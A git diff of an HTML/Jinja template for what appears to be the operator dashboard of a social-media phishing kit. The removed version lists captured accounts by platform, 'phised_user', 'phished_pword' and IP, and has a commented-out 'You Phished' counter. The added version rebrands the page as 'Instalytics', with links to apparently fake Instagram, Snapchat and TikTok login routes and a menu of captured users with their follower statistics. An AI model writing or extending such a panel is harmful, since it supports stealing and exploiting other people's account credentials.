@@ -1,143 +1,59 @@
 <!DOCTYPE html>
-<html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
-    <title>Home Page</title>
-    <!-- core:css -->
-    <link
-      rel="stylesheet"
-      href="{{ url_for('static', filename='vendors/core/core.css')}}"
-    />
-    <!-- Layout styles -->
-    <link
-      rel="stylesheet"
-      href="{{ url_for('static', filename='css/demo_2/style.css')}}"
-    />
-    <!-- End layout styles -->
-    <link
-      rel="shortcut icon"
-      href="{{ url_for('static', filename='images/favicon.png') }}"
-    />
-    <link
-      rel="shortcut icon"
-      href="{{ url_for('static', filename='css/homepage/styles.css') }}"
-    />
-  </head>
-  <body>
-    <div class="container mt-4">
-      <!-- partial:partials/_sidebar.html -->
-      <!-- <nav class="sidebar">
-        <div class="sidebar-header">
-          <a href="#" class="sidebar-brand"> stats<span> site</span> </a>
+<head>
+    <link rel="stylesheet" href="{{url_for('static', filename='css/homepage/homepage.css')}}">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+</head>
+
+<body>
+    
+    <div class="dropdown">
+        <button class="dropbtn">Add user</button>
+        <div class="dropdown-content">
+        <a href="/instagram/login">Add IG</a>
+        <a href="/snapchat/login">Add Snap</a>
+        <a href="/tiktok/login">Add TikTok</a>
         </div>
-      </nav> -->
-      <!-- partial -->
-
-      <div class="">
-        <!-- partial:partials/_navbar.html -->
-        <!-- <nav class="navbar">
-          <ul class="nav">
-            <div class="figure mb-3 nav-item">
-              <img
-                style="border-radius: 50%"
-                src="https://via.placeholder.com/100x100"
-                alt="profile"
-              />
-            </div>
-          </ul>
-        </nav> -->
-        <!-- partial -->
-
-        <div class="page-content">
-          <div
-            class="row mb-3 d-flex justify-content-between align-items-center flex-wrap grid-margin"
-          >
-            <div class="col-md-4">
-              <img
-                class="pfp"
-                src="https://via.placeholder.com/100x100"
-                alt="profile"
-              />
-              <br />
-              <h3>{{curr}}</h3>
-            </div>
-            <div class="col-md-4">
-              <h1>Site logo here</h1>
-            </div>
-            <div style="float: right" class="col-md-4">
-              <button style="margin-left: 60px" class="btn btn-info">
-                Add User
-              </button>
-              <button style="margin-left: 20px" class="btn btn-success">
-                Your Users
-              </button>
-            </div>
-          </div>
-          <div style="margin-top: 100px">
-            <div>
-              <h4 class="mb-3 mb-md-0">Users different info here lol</h4>
-            </div>
-
-            <div>
-              <a href="/instagram/login">Instagram add</a> <br />
-              <a href="/snapchat/login">Snapchat add</a> <br />
-              <a href="/tiktok/login">Tik Tok add</a> <br />
-              <h1>Your accounts</h1>
-              {% for user in users %}
-                <p>{{user.platform}} # {{user.phised_user}} # {{user.phished_pword}} # {{user.ip}}</p>
-              {% endfor %}
-            </div>
-          </div>
-          <!-- <div class="row">
-            <div class="col-12 col-xl-12 stretch-card">
-              <div class="row flex-grow">
-                <div class="col-md-12 grid-margin stretch-card">
-                  <div class="card">
-                    <div class="card-body">
-                      <div
-                        class="d-flex justify-content-between align-items-baseline"
-                      >
-                        <h6 class="card-title mb-0">You Phished</h6>
-                      </div>
-                      <div class="row">
-                        <div class="col-6 col-md-12 col-xl-5">
-                          <h3 class="mb-2">{{amount}} accounts</h3>
-                        </div>
-                        <div class="col-6 col-md-12 col-xl-7">
-                          <div id="apexChart1" class="mt-md-3 mt-xl-0"></div>
-                        </div>
-                      </div>
-                    </div>
-                  </div>
-                </div>
-              </div>
-            </div>
-          </div> -->
-          <!-- row -->
-        </div>
-
-        <!-- partial:partials/_footer.html -->
-        <footer
-          class="footer d-flex flex-column flex-md-row align-items-center justify-content-between"
-        >
-          <p class="text-muted text-center text-md-left">xo</p>
-          <p class="text-muted text-center text-md-left mb-0 d-none d-md-block">
-            Handcrafted With
-            <i
-              class="mb-1 text-primary ml-1 icon-small"
-              data-feather="heart"
-            ></i>
-          </p>
-        </footer>
-        <!-- partial -->
       </div>
-    </div>
+      <div class="dropdown">
+        <button class="dropbtn">Your users</button>
+        <div class="dropdown-content">
+          {% for user in users %}
+            <a href="/homepage/{{user.phised_user}}/{{user.platform}}">{{user.phised_user}} ~ {{user.platform}}</a>
+          {% endfor %}
+        </div>
+      </div>
+      <h1>Instalytics</h1>
+      {% if platform == 'instagram' %}
+      <img src="{{pfp_url}}" alt="avi" style="width: 200px;"></im>
+      {%else%}
+      <img src="https://www.w3schools.com/howto/img_avatar2.png" alt="avi" style="width: 200px;"></im>
 
-    <script src="{{url_for('static', filename='vendors/core/core.js')}}"></script>
-    <script src="{{url_for('static', filename='vendors/jquery.flot/jquery.flot.js')}}"></script>
-    <script src="{{url_for('static', filename='vendors/jquery.flot/jquery.flot.resize.js')}}"></script>
-    <script src="{{url_for('static', filename='vendors/bootstrap-datepicker/bootstrap-datepicker.min.js')}}"></script>
-  </body>
-</html>
+      {% endif %}
+      <h3>User logged in : {{curr}}</h3>
+      <h2>Your statistics : </h2>
+      {% if platform == 'instagram' %}
+	
+      <div class="table">
+        <div class="table-header">
+          <div class="header__item"><a id="name" class="filter__link" href="#">Followers</a></div>
+          <div class="header__item"><a id="wins" class="filter__link filter__link--number" href="#">Following</a></div>
+          <div class="header__item"><a id="draws" class="filter__link filter__link--number" href="#">Posts</a></div>
+
+        </div>
+        <div class="table-content">	
+          <div class="table-row">		
+            <div class="table-data">{{followers}}</div>
+            <div class="table-data">{{following}}</div>
+            <div class="table-data">{{posts}}</div>
+
+          </div>
+    
+        </div>	
+      </div>
+      {% endif %}
+      <div class="container">
+
+</div>
+
+</body>
